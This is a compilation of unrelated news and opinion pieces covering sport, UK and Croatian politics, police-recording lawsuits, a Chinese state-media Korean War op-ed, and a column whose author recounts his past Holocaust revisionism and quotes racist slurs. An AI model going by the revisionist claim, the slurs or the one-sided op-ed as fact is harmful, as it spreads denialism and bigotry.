“The new structure will see a technical director with particular focus and responsibility for elite player development up to 16 years of age for males and females and coach education for those working in these age groups.
“From 17 years of age onwards, the national teams will have the primary role in close consultation with the technical department of developing elite players who will ultimately represent the Socceroos and Matildas.
“This will broaden the scope of Ange Postecoglou's role and the same for the long-term Matildas coach.
“This structure gives us a lot of confidence that Australia will produce generations with the right technical development.''

I'm interviewing the Green party leader on Thursday. What would you like me to ask her?
It's not much fun leading one of the smaller political parties in the UK. In a first-past-the-post parliamentary system, the London media are only really interested in what the Conservatives, Labour and (since May 2010) the Lib Dems are up to.
And if they do interview you, they often start by asking why you don't join one of the big parties. But the three main parties don't have a monopoly on wisdom. There are important, distinctive voices outside the mainstream and one of them belongs to Caroline Lucas, the leader of the Green party. I'm interviewing her tomorrow. What do you want me to ask?
I'm particularly interested in her experience in the House of Commons. She became the Green party's first MP when she won Brighton Pavilion last year and now sits as a one-MP party in parliament. Is that worthwhile, or is it a waste of time?
But there are plenty of policy issues to discuss, too, such as drugs (she wants decriminalisation to be piloted in Brighton), the riots (she has strongly criticised the harsh sentencing) and corporate tax avoidance (the subject of a bill she has tabled), as well as the environment, which she writes about regularly on the Guardian's environment blog.
We'll probably also discuss the Green party conference, which starts on Friday in Sheffield, where Nick Clegg is the local MP.
"There's a new party in town, Nick," the Greens say on their website. The threat implied in that statement is also worth exploring.
If Minnesota United FC's season home opener on March 12 were happening in the team's planned soccer-specific stadium, it would already be a sellout.
As it is at TCF Bank Stadium on the University of Minnesota campus, United is confident the club's first home match as a Major League Soccer franchise will exceed 30,000 tickets sold, with sales likely to ramp up in the next two weeks leading up to the match.
Between season-ticket sales and single-match sales, United has sold out the lower bowl of the 50,805-capacity stadium for its 4 p.m. match against Atlanta United FC. The club has opened up tickets in the upper deck to meet demand, a team spokesman confirmed Friday.
The Loons open their season Friday night at Portland Timbers.
United is also closing in on 11,000 season tickets sold, with a team-imposed limit of 11,842 (tied to state's lake total). The team couldn't start selling season tickets until officially joining MLS on Aug. 19 and didn't begin selling single-match tickets until Feb. 9.
Atlanta, also a first-year expansion side, announced Friday it had sold more than 30,000 season tickets, but it has had almost double the time to start the process.
To ramp up ticket sales in the next two weeks, United will unveil 10 digital billboards — eight in Minneapolis, two in St. Paul — this week. The billboards will feature players alongside fans, simply stating their names or their positions/jobs.
With this increased advertising, United is projecting to sell more than 30,000 tickets for the home opener.
“It's not very often you can say you were there on the first day,” said United coach Adrian Heath, recalling the first home opener for his former club Orlando City SC that drew 62,510. “The atmosphere is different than any other American sport.”
South Park loves taking shots at Hollywood leftists, and never was that done with more skill than in the episode “Smug Alert,” in which liberal self-satisfaction, personified by George Clooney and his 2006 Oscar acceptance speech, forms a giant cloud of “Smug,” a deadly combination of smog and smugness, that threatens to blanket the entire West Coast.
Well, noxious “Smug” is hardly unique to left-wing celebrities. In fact, if you happen to live in the North Hollywood/Burbank section of L.A., I”d recommend not venturing outside without a gas mask on the evening of Saturday, Aug. 29, because a stage 1 Smug alert has been issued, courtesy of Hollywood conservatives. Now, I”ll say this up front”my column this week is colored by my own experiences and motivated by personal anger. No need to call me out on that; I”m copping to it willingly. But I do hope to make a larger point, beyond my own specific beefs.
This Saturday night at the Hilton Universal City Hotel, Friends of Abe, the “underground” group of Hollywood Republicans, is honoring author and columnist Mark Steyn at its annual summer bash (with an opening act by 1990s country has-been Deana Carter, because apparently Lee Greenwood has wash to do that night). I”m certain that Mark Steyn needs no introduction to most Taki's readers. He's the brash Canadian expat who's not too keen on Muslims and Mexicans but quite supportive of white women “breeding” in great numbers. A skilled writer, Steyn gets away with saying a lot of things that would get a lesser intellect in trouble. And having been hardened by skirmishes with Canada's draconian “human rights” commissions and tribunals, he's completely unafraid of censors. And good for him. I probably agree with him about 85% of the time, and 100% in any fight that involves opposing censorship, governmental or otherwise.
“Strutting, self-congratulatory conservatives become waiflike Southern belles fainting from the vapors at the mere mention of any criticism of Israel.”
But the ominous Smug cloud of which I warn will come not from him, but rather from the Hollywood conservatives and local GOP functionaries who will be honoring him. I can assure you that the echo chamber of this closed-door event will be throbbing with the deafening cacophony of back-patting and arrogant, self-satisfied, “aren”t we brave?” rhetoric from the assembled members and VIPs. A month after hosting Donald Trump, Friends of Abe is honoring a man whose rhetoric might be too rich for even The Donald. “America has more Mexicans than anybody needs, and then some” is a recent Steyn bon mot. “Why do immigrants rape out of all proportion to their numbers?” is another. Oh, and it should be pointed out that, according to the Ontario Human Rights Committee, Steyn's fans (no, not Steyn himself, but people who applaud his work) “called for the mass killing, deportation or conversion of Muslim Canadians.”
What bravery the Hollywood conservatives and L.A. GOP will be displaying in honoring Steyn! What a stand they shall be taking against political correctness! Against “minority” pressure groups! Against censorship! And against holding an author responsible for the ravings of strangers who consider themselves fans.
Except…the very people who are honoring Steyn are the ones who banned me because of work I did 25 years ago that raised questions about whether or not Auschwitz was an extermination camp. After five years as a member, I was banned for life from Friends of Abe without being given the opportunity to explain my views, and I was banned solely on the grounds that certain other members were offended. The people who expelled and disowned me were my friends. These were people I”d worked with on a daily basis. They celebrated my political writings, they collaborated with me, they attended my events. Indeed, I was considered a liquor-affected voice of reason in their circle. But it all came to an end when my past as a Holocaust revisionist was “outed” on April 20, 2013, by National Review‘s Michael Walsh (also an FOA member). From that point on, I was worse than persona non grata. I wasn't”t just to be ignored, but fought. To this day, over two years later, mainstream sites that hire me are hit with trolling and threats from my former colleagues.
And those who couldn't”t find fault with my work faulted me for what people I never knew, “fans” I”d never met, thought of my work. “You might not be a white supremacist, but racists like your work, which makes you just as bad.”
So here's the bigger point I”m trying to make. My example proves the emptiness of the braggadocio you hear from many conservative pundits about how fearless they are in the face of political correctness: “Mexican immigrants are rapists. Palestinians are a death cult. Black Americans owe whites a “debt” for being enslaved and then freed” (a gem from David Horowitz, an original FOA member). “Women in higher education will lead to the “abolition of man.” White women need to breed more to overcome an invasion of uncivilized darkies. “Sodomites“ are waging “gayhad” against straight people. Offended? Get over it, Mr. Sensitive. We”re being brave and audacious and in-your-face! Oh, but just don”t say anything that might be offensive to Jews. That's crossing the line. Hey, look how quickly we found our sensitivity!”
When it comes to comments or positions that are viewed as offensive by large segments of the black, Latino, Muslim, female, or gay communities, the conservative line is “Let's be fearless, impudent little outlaws, and let's not be cowed by those who cry “hatred” or “racism.”” And indeed that would be a brave stance, if it extended to material considered offensive to Jews. And this applies to issues more current than the Holocaust. Strutting, self-congratulatory conservatives become waiflike Southern belles fainting from the vapors at the mere mention of any criticism of Israel (and I”m saying this as a Jew and a die-hard Israel supporter who, in 26 years as a published writer, has never written a negative word about the Jewish state). The easiest way to take down a pesky “antiwar” libertarian in GOP circles is to find something in that person's record that's critical of Israel. All of a sudden the bold, brassy, “I don”t care who I offend” conservative pundits bring out their parasols and lace fans: “Oh, I do declare, I am evah so offended by such distasteful churlishness.”

Police departments around the country continue to intimidate citizen journalists into thinking that they have no right to film officials during the course of their duties serving the public. There has been a disturbing trend of arresting people even while filming from their own property; threatening them with 15-20 years, or even life in prison if there are multiple counts.
Massachusetts has been at the forefront of an attempt to redefine illegal wiretapping laws to say that if you secretly record police, then it is a crime every bit as equal to recording your neighbor with a hidden camera or audio device.
One of the men targeted under this interpretation was lawyer, Simon Glik, who was arrested on Tremont Street, Boston in October, 2007 for filming an altercation between three police officers and a teenager. The officers were attempting to extract a plastic bag from the youth's mouth. Glik thought he was witnessing a case of police brutality, so he began filming with his cellphone. He was arrested within minutes . . . for ” illegal electronic surveillance. (Source)
Glik is just one of many who have fallen prey to Massachussets' loose interpretation of wiretapping laws.
John Surmacz filmed police roughly breaking up a holiday party he was attending in Brighton and was arrested and charged with illegal surveillance. (Source).
Madison Ruppert reports that:
Michael Hyde was charged with illegal wiretapping when he used a secretly recorded video of a police encounter as the basis for a harassment complaint.
Cambridge sound engineer, Jeffrey Manzinelli, was arrested and convicted of illegal wiretapping along with disorderly conduct for recording MBTA police officers at an anti-war rally in 2002. While he openly recorded the officer, which is completely legal, a 2007 court case upheld his conviction on the basis that he had a hidden microphone in his sleeve.
Peter Lowney was arrested and convicted of illegal wiretapping in 2007 when Boston University police officers claimed he had hid a camera in his coat during a protest. (Source)
And the list goes on. However, despite this assault on basic protections afforded by the Constitution, there has been an equal backlash resulting in many courts around the country ruling that these eavesdropping laws are, in fact, completely made up and unconstitutional.
Places like Cook County, Illinois have backed the First Amendment in cases like that of Christopher Drew who was facing 15 years in prison for violating the state's Eavesdropping Act. Another case in Illinois was dismissed in less than one hour. Incidentally, this might have played a part in the decision to move the upcoming NATO/G8 Summit.
Now, the city of Boston has been forced to go one step further than merely acquitting those charged — they have had to respond to Glik's own lawsuit against them. As part of the settlement, Boston will pay Glik $170,000 in damages and legal fees, thus sending a warning to law enforcement that they will be watched and recorded by the public, as well as a warning to cities and states who will disobey the Constitution.

As summarized by the ACLU:
The settlement follows a landmark ruling last August by the U.S. Court of Appeals for the First Circuit, declaring that the First Amendment protects the right to record police carrying out their duties in a public place, Glik v. Cunniffe 655 F.3d 78 (2011). The First Circuit's ruling is binding only in Massachusetts, New Hampshire, Maine, Rhode Island, and Puerto Rico, but its persuasive reasoning has been cited by courts and lawyers nationwide facing the recurrent issue of police arresting people for filming them.
The Massachusetts wiretap statute prohibits only secret recording of audio. The First Circuit in Glik's case affirmed that an arrest under the statute for openly recording the police would violate not only the First Amendment right to gather information but also the Fourth Amendment's guarantee against false arrests.

The war that changed the world: 60th anniversary of Korean War By Han Dongping (chinadaily.com.cn)
Updated: 2010-10-18 09:46
This year is the 60th anniversary of the Korean War. For most people today, that brutal contest of human wills, with millions of casualties on both sides, which brought humanity to the edge of a nuclear blast, is too distant to worth mentioning anymore. But for the Chinese who have enjoyed one of the longest spans of peace, the Korean War should always be remembered, and the sacrifices the Chinese people made to defend their motherland and the contribution they made to world peace in the harshest conditions should never be forgotten. For the American people, the war should be equally worth remembering, in the words of General Clark, who signed the first document of cease-fire without victory.
In 1972, President Nixon came to China and said to the then-Chinese leader Mao Zedong, "Mr. Chairman, you have changed the world." For the president of the most powerful nation in the world to acknowledge that a leader of a poor Third World country had changed the world, the world must have really changed.
The Americans realized the world had changed in 1950, when the Chinese leaders decided to enter the Korean War to resist the most powerful nation in the world in defense of their motherland and in support of a friendly neighbor. The Chinese had claimed that the world had changed the year before when the People's Republic was founded. But the Western powers, particularly the United States, refused to recognize that the world had changed for them and for the Chinese. When General MacArthur was asked what if the Chinese intervened in the war, his answer was quick and resolute, "It would the biggest manslaughter in human history." General MacArthur was not wrong. Before the founding of the People's Republic, the Chinese military lost almost every encounter it had with foreign powers for a little over one hundred years. With the stigma of the sick man of the East, nobody was willing to take the Chinese seriously. General MacArthur and other world leaders were not willing to accept the fact that the world had changed until they were shown what their opponents could do to them.
Before the founding of the People's Republic of China, the rule of the game in the world was that the powerful would do whatever they pleased, and the weak had to put up with whatever they had to put up with to survive. In the words of former British Prime Minister Tony Blair, they will deal with Western countries according to international law, but they will deal with Third World countries with preemptive strikes. They would bomb a Third World country first before they argue why they bombed it. If it turned out that the reason for bombing was unfounded, they would tell you that it was collateral damage. One cannot blame the Western world for what they did to the Third World country. They have been able to get away with that for so long that it has become an instinct of the powerful nations. In order to change that existing culture of the world, the Third World countries have to be willing to fight to defend what is theirs. If you are not willing to fight to defend what is yours, the powerful will take it as consent for them to take it from you. If one desires peace, the best guarantee is one's willingness and readiness to fight against the aggressors.
Some Chinese, in an effort to improve relations with the United States, want to forget the Korean War altogether. They do not recognize the significance of the Korean War for China, the United State and for the whole world. The significance of the Korean War is that it laid the foundation for the Sino-US relations. Without that contest in the Korean War, the US would have continued to refuse to take China seriously, and would not have given the People's Republic of China the respect it deserved. Without due respect, there would be no solid foundation for China and the US to build a mutually beneficial relationship.
Some people in China today argue that China's entry into the Korean War was unwarranted because the US goal at the time was not to invade China. These people are both ignorant and naïve. Yes, Truman's initial order to MacArthur and the United Nations force was to repel the North Koreans back to the 38th parallel. But with his initial success, General MacArthur readjusted his goal to wiping out North Korea completely. By the time Chinese volunteers entered the war in October 1950, General MacArthur had ignored several Chinese warnings, and the American and South Korean forces had advanced to the Chinese borders. General MacArthur began to talk about his goal of reversing the results of the Chinese Civil War and of introducing Chiang Kai-shek's forces into the Korean conflicts. The old Chinese saying, Delong wangshu, (after getting the Long territory, Shu became the next target) accurately describes human behavior. Many people read too much into the fact that General MacArthur was dismissed by Truman in the end. He was dismissed because the Chinese volunteers had inflicted huge casualties on the United Nations forces. If the Chinese did not enter the war at that time, the world we live in today would have been very different indeed.
When China entered the Korean War, General MacArthur demanded authorization to use 30 nuclear bombs on the Chinese Northeast to create a radioactive wall so that Chinese would no longer be able to continue the war. Many people would like to label MacArthur as crazy. The truth of the matter is that he was not crazy at all. He was very normal, just as Truman was normal. Truman did not hesitate to use nuclear bombs against Japan. The Truman administration designed 10 plans to use nuclear weapons to attack the Soviet Union before the Soviet Union developed its nuclear bombs in 1949. China was saved from a nuclear disaster not because of American good sense. It was saved because of its fear of the Soviet retaliation on China's behalf. Later, the US offered the French the use of nuclear bombs in Dien Bien Phu, which was rejected by the French.
During my mother's childhood, her family suffered from air raids twice and was robbed three times. As I grew up, listening to my mother's childhood stories of these bombings and robberies, in my childish mind these kinds of things would not happen again. Today, as I study world history and politics, I feel almost certain that these kinds of things can happen again to China if the Chinese people get complacent, and forget the hard-won lessons of the Korean War. China is a peace-loving nation. But it does not matter how much you desire peace, you can never relax your willingness to defend yourself. Without the willingness and readiness to defend yourself, you do not deserve peace.
• Goalkeeper picked up knock on return to training with Chelsea • Asmir Begovic set to step up in place of Courtois
Thibaut Courtois has undergone surgery to his right knee and is expected to be out for up to three months.
The Belgian goalkeeper returned unscathed from international duty only to tear the meniscus in the knee during a training session with the club's other goalkeepers on Wednesday. He had the operation in Barcelona on Thursday at the city's Clinica Quirón.
Chelsea said in a statement on Friday that Courtois had “surgery on an avulsion of the posterior corner and medial part of the internal meniscus of his right knee. The successful surgery consisted of a reattachment of the meniscus by suturing”.
Mourinho described the setback as a “big blow” but he said that he would not complain about it. Asmir Begovic, the summer signing from Stoke City, will deputise with the 21-year-old, Jamal Blackman, now promoted to the substitutes' bench.
Everton's Roberto Martínez: no grudge against Chelsea's José Mourinho Read more
Blackman has made only one senior appearance so far in his career – for Middlesbrough, during a loan spell last season, in the Capital One Cup defeat at Liverpool. After a 2-2 draw, Middlesbrough lost 14-13 on penalties.
“It's a big blow but you will not see me speaking again about Thibaut,” Mourinho said. “It's not easy to have the best goalkeeper in the world injured. But it is easy to have one of the best goalkeepers in the world to play. Begovic is very, very good. I'm sad for Thibaut and sad for the team but we have a top goalkeeper and Begovic will be in goal.”
On Blackman, Mourinho said: “The third goalkeeper is always a complicated situation. You can be third goalkeeper and not sit on the bench once all season. Or you can be third goalkeeper and play a big match. In my first spell here, Hilário played against Barcelona when he was the third goalkeeper.
“Our decision was that the third goalkeeper would be a young English goalkeeper, behind two fantastic goalkeepers. We think that's a good decision. We lose Courtois for a long, long time and now Jamal becomes the second.
“He was on loan at Middlesbrough and he did not play one single match in the Championship, just one cup match against Liverpool. He does not have experience but he has potential.”
Mourinho had a sarcastic comment for Fifa, after hearing that the governing body had made a statement about the on-going fallout from Mohamed Salah's season-long loan move to Roma. Salah spent last season on loan at Fiorentina and the Italian club felt that they had an agreement with Chelsea to take him back. Salah, though, opted for Roma and Fiorentina have now lodged an official complaint with Fifa over breach of contract.
A Fifa spokesman said: “We can confirm having received a claim from the Italian club, Fiorentina, against the English club, Chelsea, and the player, Mohamed Salah, for breach of contract. The matter is still pending and being investigated.”
Chelsea did have an agreement with Fiorentina but it was dependent on Salah wanting to go back there. He did not and so, in Chelsea's eyes, the agreement was null and void. Mourinho said: “I am happy that Fifa have time for other things in the middle of such great weather around them.”
“I did not know of the security community, and Mr Robot has opened doors and I want to talk to Sam about bringing the rest of the cast to this”.
In an interview with Qualys CTO Wolfgang Kandek at RSA Conference in San Francisco, Malek claimed that he researched the role for the acclaimed show Mr Robot as he would any other, and with this he used the internet a lot and read “Hacking for Dummies”. “All the coding was accurate and there was no CGI used on the screen, it was me typing,” he said.
He said that the intention of Mr Robot executive producer Sam Esmail was to be accurate, and Malek claimed that he had seen movies which did not do such a good portrayal and deal with every aspect of the show. “The CSI:Cyber cast applauded me for the accuracy, and I wanted to raise it up a level,” he said.
In preparing for the role, Malek said: “I didn't worry about it unless I was learning my lines and hitting my marks, but when I sat down at a computer with our technical advisor, I wanted to understand that the work I did was two-fold and as authentic as possible.”
Malek also talked about the rewards, love and fanmail he got for the show being worth it, especially for his portrayal of a character with ADHD and levels of autism. “It is incredibly fulfilling for everyone on the show, I love the response to it and that people can relate to him,” he said.
Set to head off to begin shooting on series two tonight, Malek said that the show was renewed when the initial series began to air as it coincided with the Sony Pictures hack. “I hate that is happened, but I think it helped us get renewed,” he said.
Asked by Kandek if he had learned anything about security from making the show, Malek said he had changed passwords and started to use two-factor authentication, as well as becoming more conscious of what was being put on social networks.
Glen Johnson has revealed how a month spent recuperating on the sidelines helped him return to the Liverpool line-up feeling stronger than ever.
After appearing against Aston Villa on January 18, Johnson missed the following six games before being reintroduced for the Swansea City clash in late February.
The full-back played 90 minutes as the Swans were edged 4-3 at Anfield. He then completed both 3-0 victories on the road against Southampton and Manchester United.
Johnson told Liverpoolfc.com: "It feels good to be back. No player wants to be missing matches through injury. I feel myself again.
"I was playing for a few months with niggling injuries and things that were stopping me from putting in performances that I'm used to. It was a hard time and frustrating but I feel better for it now.
"Everyone will play through pain every week; you probably never play a football match feeling 100 per cent.
"That just doesn't happen these days. But in terms of having injuries that are stopping you from playing to the best of your ability, that's hard to take.
"When people see you playing, they assume you're fit, and then when you don't put in the performances that you are used to, people are wondering why. But it's part and parcel of the game, and you've just got to get through those periods."
Johnson's return has coincided with Liverpool rising to second place in the Barclays Premier League table - four points behind leaders Chelsea, with a game in hand on the London side.
Back-to-back away triumphs at St Mary's and Old Trafford, both earned by impressive displays from brendan Rodgers' men, mean spirits are running sky-high at Melwood, according to the Reds' No.2.

"It is a good time," explained Johnson. "We're in a good position in the league and playing well. Everyone involved in the club is enjoying it at the moment.
"We have worked very hard to be able to put in performances like the one against United. To do that against one of your biggest rivals is a great achievement, a good day for everyone involved and a great three points.
"Every game you win, it's three points, and that is the key thing for us at the moment - to keep chipping away, getting the victories.
"We've got plenty of games left in the league at the moment, so that's our priority, that's what we've got to work for and try to pick up as many of the three points as we can."
SOMETIMES inspiration strikes in the most unlikely of places. For Alison Wonderland, the muses came to her one night at a Gold Coast strip club.
“There was a DJ playing and I went up to him and asked, ‘Can I have a spin?' He was like, ‘Are you good?' He actually let me play and I ended up DJing for an hour at this strip club.”
Later that night, basking in the glow of her surprise set, Alison thought how great it was to play somewhere other than a typical nightclub. Her agent suggested they book a tour in non-traditional venues.
From there followed the birth of her summer festival tour, the WonderlandScarehouseProject, a multi-series event that makes its return this weekend after a year off (it takes place in Brisbane, Melbourne, Sydney and Auckland, with condensed versions in Adelaide, Hobart and Perth). While the party has grown, it hasn't changed from its core ethos: to showcase music Alison herself personally feels passionate about in a setting outside and beyond the expected.

Santa Casa de Misericórdia is a Portuguese charity founded in Lisbon in 1498 by Queen Leonor of Portugal.[1]
It declares itself to be a Catholic lay brotherhood and to work through 14 Works of Mercy, seven of a spiritual nature: to teach the humble, to give good advice, to punish those who do wrong, to console the sad, to pardon offenses, to suffer patiently, to pray for the living and for the deceased; and seven of a corporeal nature: to visit the ill and imprisoned, to free captives, to clothe the naked, to feed the hungry and thirsty, to shelter travelers and to bury the dead.[2] It is currently the oldest working NGO in the world, if not the first. It isn't supervised by the Church or the State.
After the Lisbon Santa Casa da Misericóridia de Lisboa,[3] similar organizations were created in many other cities and towns of Portugal and of the former Portuguese Empire, like in Brazil, Macau and even in Nagasaki, Japan.[4]

Caparra is an archaeological site in the municipality of Guaynabo, Puerto Rico. It was declared a U.S. National Historic Landmark in 1994. The site contains the remains of the first Spanish capital of the island, settled in 1508 and abandoned in 1521. It represents the oldest known European settlements on United States territory.[1]
The site is on the grounds of the Museum of the Conquest and Colonization of Puerto Rico (Museo de la Conquista y Colonizaciòn), which features artifacts from the site and other archaeological sites in Puerto Rico.
History [ edit ]
In 1508, Juan Ponce de León founded the original Spanish settlement in Puerto Rico at Caparra (named after the province of Cáceres, Spain, the birthplace of then-governor of Spain's Caribbean territories Nicolás de Ovando),[3] which today is known as the Pueblo Viejo sector of Guaynabo, just to the west of the present San Juan metropolitan area. But the air was not wholesome and the mendicant friars insisted on moving the settlement closer to the bay and to the sea. They complained that the infants were dying. Their preferred area was that of the Islet of Puerto Rico ("rich port" or "good port"), because of its similar geographical features to the island of Gran Canaria in the Canary Islands. It was not until the end of Ponce de León's tenure as governor that they had their wish. By 1521, the move was complete and it was known as "Villa de Puerto Rico." With time the name of the island, San Juan Bautista de Puerto Rico, traded places with what is now the capital of Puerto Rico: San Juan.[4]
According to Floyd, "Ponce built the only stone house in the village, which for years functioned additionally as the Casa de Contratacion, the archive, and the arsenal." It became his permanent home, where he was joined by his family in 1509.[5]
Archaeological history [ edit ]
The Caparra Site was first identified as important during a survey in 1936, as part of a program to develop tourist facilities on the island. Preliminary excavations in 1936 and 1937 identified a large tapia structure, bisected by a two-lane highway, that matched de León's description of his own residence, the only non-wooden structure in the settlement. Further excavation identified the main plaza and the sites of other buildings. The property was acquired by the Puerto Rican government in 1948, which relocated the northern section of the house ruins in order to widen the road. The roadway was again widened in 1963, destroying the southern portion of the structure excavated in 1936. The museum was established in 1958; the site continues to be examined by archaeologists.[6]

BioWare has discussed its business strategy for providing extra (paid) content to players after a game has been released.
One such method includes day-one DLC, something the Mass Effect studio is convinced gamers can be tempted with.
"Fans do want more content. From the moment the game launches. They tend to say 'I want it now!' So it needs to be there when it's ready," BioWare online development director Fernando Melo explained at GDC Europe today. "They choose when to pick it up, day one or later."
Mass Effect 3 launched alongside the day-one DLC pack From Ashes, which included an extra squadmate and missions. The earlier that players bought the add-on, the more dialogue options and content were available with that squad member, who doled out a hefty chunk of important in-game lore.
Day-one DLC makes business sense, Melo continued, as it meant that writers and concept artists who had finished their jobs on Mass Effect 3 could be put back into work immediately - while their colleagues continued on the main game.
In Melo's eyes, another form of day-one DLC is the Online Pass, although new copies of the game may ship with the content. 11 per cent of all Mass Effect 2 DLC revenue came from the Online Pass, content that had already been planned for as an incentive to new customers.
"An analogue [to the Online Pass] is free-to-play games, or games with a premium layer of service," Melo added, name-checking Call of Duty Elite and Battlefield Premium. An Online Pass could be seen similarly, as an 'out-of-the-box premium service'.
Mass Effect 3 also added micro-transactions to the franchise. The game lets players spend real-life money unlocking multiplayer content such as weapons and character classes, allowing users faster access than by simply using in-game currency.
"If you have five DLC packs at $10 each, you can only ever earn a total of $50," Melo explained. Micro-transactions allow the "potential for more" player spending, and give gamers the ability of extra "choice".
"Gamers are actually happier, as they are able to spend money when they want. People may not want to pay upfront. They may be happier to pay when they are 'in the moment'."
Overall, the packs have been "very successful for us", Melo concluded, adding that their sale has allowed the development of several free multiplayer expansions, which has in turn encouraged more players to the game, who have then spent more money on content packs.
Pastor Maldonado says he is "happy" to be leaving Williams, following the team's decision to sign Felipe Massa.
The Venezuelan has split with Williams after three years with the team, which included one win in Spain last year but poor years in bad cars in 2011 and '13.
"I wanted to leave the team and I'm happy about that," Maldonado said.
"It's been a tough year, very hard for the whole team, but personally I want to drive something different. This is an important time in my career."

Maldonado said leaving Williams, who gave him his F1 debut, was "a tough decision - my decision - but a great one".
The 28-year-old's relationship with Williams is linked to the team's sponsorship deal with the Venezuelan state oil company PDVSA, which started in 2011 on a five-year contract worth £30m a year.
But Maldonado and PDVSA both wanted to leave the team and Williams were also keen to move on with a new driver and sponsor.
They have come to a settlement that will end the PDVSA association by mutual consent.
In 2012, Williams had their best season for years, which included Maldonado qualifying in the top 10 on 13 occasions, seven of them in the top six.
But Maldonado squandered several potential strong points finishes with errors and accidents - after his win in Spain he did not finish in the points for the next nine races.
And this season they are poised for the worst year in their history. They have scored only one point, for Maldonado's 10th place in Hungary, and are ninth in the constructors' championship with two races to go.
Maldonado said: "Overall, I feel I delivered more to the team than they did for me.
Pastor Maldonado Team: Williams Previous teams: None Born: 10 March 1985, Maracay, Venezuela Career wins: 1 Career pole positions: 1 2013 points: 1
"We had a victory, some good results last year, and even this year we've done well in some races, but this is not everything.
"I'm waiting and expecting something more from Formula 1."
Maldonado is hoping to go to Lotus, although that team would prefer to take Sauber's Nico Hulkenberg for 2014.
The decision may depend on whether a mooted investment deal by Lotus, which has been rumbling on for several months, comes to fruition.
Maldonado can take his PDVSA sponsorship to his next team and Lotus may be forced to take him if the investment deal does not come off. His other options are Sauber and Force India.
Maldonado said: "At the moment nothing's signed [with another team]. We're working on things. We're talking with Lotus, and I've another couple of options.
"I hope soon to have a clear decision with everything all sorted, and a clear road for next year.
"The important thing for me is to be in Formula 1," said Maldonado.
"Of the young drivers I'm the only one who has won a race, so I can deliver a lot.
"Last year I was always competitive, but because of the condition of the car I've had this year, everyone has forgotten my talent, the results and where we were last year.
"But I 100% believe in my talent. I've won all the categories in the past, and I hope to win in Formula 1 again next year."

LOS ANGELES (AP) — The TV Land channel says William Shatner will guest star on this month's live premiere of "Hot in Cleveland."
Brian Baumgartner of "The Office" also will be part of the episode, which is set to air live on the East Coast at 10 p.m. Wednesday, June 19. West Coast viewers will see a taped version of the episode at 10 p.m. PDT.
"Hot in Cleveland" stars Valerie Bertinelli, Jane Leeves, Wendie Malick and Betty White as single friends from LA who settle in the Ohio city. The 91-year-old Betty White plays their housekeeper.
Shatner, who's 82, joked that at long last he's working with someone older.
An article published recently in The Economist argues that Germany is extremely concerned about the Three Seas Initiative, led by Poland and Croatia, and believing that there is something more sinister behind announced economic projects. The magazine claims that for the Berlin-based officials, including German Chancellor Angela Merkel, the initiative seems to be an attempt to divide Europe and weaken the influence of Germany on its neighbours, reports Jutarnji List on 20 July 2017.
One of the possible answers is the launch of a new European infrastructure fund which would show whether Poland and its allies, including Croatia, are more interested in investments or whether the Initiative is more of a geopolitical project.
“The truth is that this Initiative is just about strengthening the cohesion of the European Union. In this way, we want to remove the differences between ‘old' and ‘new' members, and the goal of this informal initiative is certainly not to weaken the EU but to strengthen it instead,” say sources close to the Croatian President. German diplomacy has reportedly recognised the interests of Croatia, which are focused primarily on enhancing the cohesion in Central Europe and the realisation of projects that the EU is interested in. “All serious stakeholders have recognised our views, and there is no problem,” said the President's associates.
However, Croatia's Member of European Parliament Ivan Jakovčić says that his colleagues in the European Parliament often ask him about Croatian foreign policy. “Polish President Andrzej Duda was one of the extremists during his term in the European Parliament, and his views are by no means close to the Croatian positions. I am sure that the Three Seas Initiative is not part of foreign-policy interests of Croatia,” says Jakovčić's.
He adds that the interest of the United States, no matter who is in power, is to have weak Europe and that the Initiative is an attempt to reduce the EU's influence on global processes. It is disastrous for Croatia to be among countries that will not be the proponents of the Union's policy.
“It is a pity for Croatia that, after 27 years of independence, it still does not lead a clear foreign policy, but is flirting with policies which are not in our interest, primarily because of personal reasons.” Jakovčić says that Prime Minister Andrej Plenkovic and President Kolinda Grabar-Kitarović no longer lead coordinated foreign policy, given that the Prime Minister is engaged in protecting the essence of the EU, while “the President is prone to foreign-policy adventures and is too closely aligned with US views.”
While the Foreign Ministry officially did not want to comment on Jakovčić's criticism of Grabar-Kitarović, claiming that Croatia has a single foreign policy, sources close to the government admit that there is fear that Germany might misunderstand Croatia's approach to the United States. Namely, the Prime Minister has always tried to maintain a balance between the European Union and the United States, while many believe that the President is putting too much emphasis on good relations with Washington.
No one, of course, disagrees that Croatia needs to have excellent relations with the United States, but the priority is the EU's interests. Jakovčić says that Croatia's foreign policy priority is to enter the Schengen Area and introduce the euro. “That is why I warn about the Three Seas Initiative, which has been created by those who are criticised in Brussels due to their undemocratic policies at home.”

Uni to change alcohol policy after drunken display
Updated
The University of Adelaide says it will implement a new responsible alcohol policy after a student pub crawl got out of hand in Adelaide's CBD.
Thousands of students from the engineering department ran onto the road at the intersection of Pulteney and Rundle Streets on Friday night as the lights turned red.
At least one participant jumped onto the bonnet of a car.
The students wore shirts carrying the phrase 'Boozing Bad', a reference to a US television show in which a chemistry teacher manufactures illicit drugs.
A spokeswoman for the university says Vice-Chancellor Professor Warren Bebbington has met student representatives about the incident.
She says the university will bring in a new alcohol policy for student clubs.

It's a bit tough for me to write about TV right now. Keeping up with the news these days has a way of making virtually everything else seem trivial. Case in point: for the past several weeks I've been binge-watching The Americans, which is absolutely incredible - but I can't go on social media, read the news, or watch TV without hearing about what the real Russians are up to right now (and it's not nearly as fun as Elizabeth killing old guys in pools or Philip screaming about Jesus). I'm in the middle of working on another article about why escapism in television is so critical right now, and writing that story is what helped me decide on my latest addition to SpoilerTV's Throwback Thursday series: it had to be Veronica Mars.
Above all else, I wanted to watch something that would take me 100% out of reality for 40 minutes. Veronica Mars often touched on important issues, but the scripts, direction, and acting are so brilliant that it's impossible to not just let the real world fall away and become engrossed in the story. Sometimes that's exactly what I need from television.
